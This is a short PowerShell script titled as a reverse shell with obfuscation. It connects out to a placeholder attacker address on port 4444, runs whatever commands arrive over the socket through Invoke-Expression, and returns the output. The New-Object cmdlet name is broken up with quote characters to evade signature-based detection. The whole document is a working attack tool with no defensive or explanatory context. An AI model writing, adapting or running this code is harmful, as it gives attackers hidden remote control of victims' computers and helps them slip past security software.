# Reverse Shell with Obfuscation
$ip = "YOUR_IP"
$port = 4444
$client = N'e"w-O'B'je"c'T System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$buffer = New-Object Byte[] 1024
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $command = (New-Object Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
    $output = Invoke-Expression $command 2>&1
    $response = ([text.encoding]::ASCII).GetBytes($output + "PS> ")
    $stream.Write($response, 0, $response.Length)
    $stream.Flush()
}
$client.Close()
